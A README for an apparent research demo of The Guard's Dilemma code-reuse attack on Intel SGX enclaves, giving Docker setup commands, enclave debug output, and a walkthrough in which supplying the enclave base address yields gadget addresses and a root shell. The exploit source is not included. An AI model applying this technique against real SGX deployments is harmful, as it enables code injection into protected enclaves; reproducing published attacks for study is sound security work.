# How to create docker container
sudo ./up.sh

# How to destroy docker container
sudo ./down.sh

# How to enter the docker container
sudo docker exec -it sgx16_test_1 /bin/bash

## Once inside docker
```
root@...:/home/linuxsgx#  source /opt/intel/sgxsdk/environment
root@...:/home/linuxsgx# cd GuardsDilemma
root@...:/home/linuxsgx/GuardsDilemma# make
root@...:/home/linuxsgx/GuardsDilemma# ./app
```

## After execution you will probably see

```
[build_secs /home/linuxsgx/linux-sgx/psw/urts/loader.cpp:385] enclave start address = 0x7f8fdbac4000, size = 800000
[__create_enclave /home/linuxsgx/linux-sgx/psw/urts/urts_com.h:167] add tcs 0x7f8fdbe57000
[__create_enclave /home/linuxsgx/linux-sgx/psw/urts/urts_com.h:167] add tcs 0x7f8fdbe9e000
[__create_enclave /home/linuxsgx/linux-sgx/psw/urts/urts_com.h:167] add tcs 0x7f8fdbee5000
[__create_enclave /home/linuxsgx/linux-sgx/psw/urts/urts_com.h:167] add tcs 0x7f8fdbf2c000
[__create_enclave /home/linuxsgx/linux-sgx/psw/urts/urts_com.h:167] add tcs 0x7f8fdbf73000
[__create_enclave /home/linuxsgx/linux-sgx/psw/urts/urts_com.h:167] add tcs 0x7f8fdbfba000
[__create_enclave /home/linuxsgx/linux-sgx/psw/urts/urts_com.h:167] add tcs 0x7f8fdc001000
[__create_enclave /home/linuxsgx/linux-sgx/psw/urts/urts_com.h:167] add tcs 0x7f8fdc048000
[__create_enclave /home/linuxsgx/linux-sgx/psw/urts/urts_com.h:167] add tcs 0x7f8fdc08f000
[__create_enclave /home/linuxsgx/linux-sgx/psw/urts/urts_com.h:167] add tcs 0x7f8fdc0d6000
[set_extra_debug_info /home/linuxsgx/linux-sgx/psw/urts/enclave.cpp:269] Symbol 'g_peak_heap_used' is not found
[__create_enclave /home/linuxsgx/linux-sgx/psw/urts/urts_com.h:194] Debug enclave. Checking if VTune is profiling
[__create_enclave /home/linuxsgx/linux-sgx/psw/urts/urts_com.h:235] VTune is not profiling. Debug OPTIN bit not set and API to do module mapping not invoked
[read_cpusvn_file ../cpusvn_util.cpp:96] Couldn't find/open the configuration file /root/.cpusvn.conf.
Checksum(0x0x7ffd125f3660, 100) = 0xfffd4143
Info: executing thread synchronization, please wait...  
Give me the base address: 
```
There is more output on top but for convinence it was cut. The first line above show enclave start address = 0x7f8fdbac4000. This is the base address of the enclave. Similar attacks like SnakeGX (which was used to actually understand how the attack is done) use /proc/(PID)/maps and search for isgx (for recent version of SGX driver the name has changed) to get the enclave start address. This is done in HW mode but in SIM mode it is give like we see here.

So we give the enclave address:
```
Give me the base address: 0x7f8fdbac4000
Received: 7f8fdbac4000
asm_oret: 7f8fdbaccc27
continue_execution: 7f8fdbacccfe
writeGadget: 7f8fdbaccce5
fakeStack: 7ffd125f37b0
ctx: 7ffd125f3ad0
mov 7ffd125f3700, $rdi
call 7f8fdbacccfe
# whoami
root
```
Now at the end we get the shell indicating we have succeeded injecting code and executing code using sgx sdk functions. 

## dont forget to close the docker container
sudo ./down.sh